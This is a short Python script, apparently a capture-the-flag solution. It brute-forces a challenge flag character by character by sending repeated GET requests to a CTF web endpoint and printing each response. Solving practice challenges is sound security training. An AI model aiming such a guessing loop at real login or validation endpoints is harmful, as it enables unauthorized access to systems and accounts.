#!/bin/python3

import string
import random
import requests
from bs4 import BeautifulSoup

charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
url = "https://web.ctf.rasyidmf.com/chal16/"
# total char = 36
char_length = 29
flag = "brut3_f0......................"

temp = list(flag)

# loop through first index of flag

def char_iterate(idx):
    for i in range(len(charset)):
        index = idx
        new_char = charset[i]
        temp[index] = new_char
        flag = "".join(temp)
        param = {"flag": "CTFR{"+flag+"}"}
        req = requests.get(url, param)
        res = BeautifulSoup(req.content, "html.parser")
        print(res.get_text())
